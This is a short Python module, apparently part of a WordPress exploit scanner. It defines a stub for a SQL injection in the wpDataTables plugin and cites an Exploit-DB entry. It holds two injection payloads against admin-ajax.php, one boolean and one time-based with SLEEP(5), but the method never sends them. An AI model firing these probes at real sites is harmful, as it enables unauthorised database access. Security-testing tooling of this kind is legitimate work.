from ..exploitsql import ExploitSql


class WPDataTablesSQL(ExploitSql):

	EXPLOIT_NAME = 'wpDataTables'
	EXPLOIT_VERSION = '1.5.3'
	EXPLOIT_URL = 'http://www.exploit-db.com/exploits/35340/'

	def exploit(self):
		# TODO Get plugin to test on local server
		exploit = {
			1: '/wp-admin/admin-ajax.php?action=get_wdtable&table_id=1 AND 9029=9029',
			2: '/wp-admin/admin-ajax.php?action=get_wdtable&table_id=1 AND SLEEP(5)'
		}
		ExploitSql.exploitnotfound(self.EXPLOIT_NAME, self.EXPLOIT_VERSION)
